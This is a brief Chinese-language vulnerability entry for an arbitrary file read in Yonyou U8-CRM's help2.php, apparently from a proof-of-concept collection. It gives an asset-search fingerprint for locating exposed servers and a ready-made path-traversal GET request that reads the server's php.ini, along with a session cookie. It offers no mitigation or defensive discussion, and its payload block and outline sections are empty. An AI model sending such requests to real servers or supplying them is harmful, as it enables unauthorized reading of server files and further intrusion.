# 用友U8-CRMhelp2任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="用友 CRM"`
- **请求**：`GET /pub/help2.php?key=%2F..%2F..%2Fapache%2Fphp.ini HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=6ig6226ujdpn5m97e3hopdur26`

**请求体 / payload**
```

```

**其他**
- 用友U8-CRM help2任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8-CRM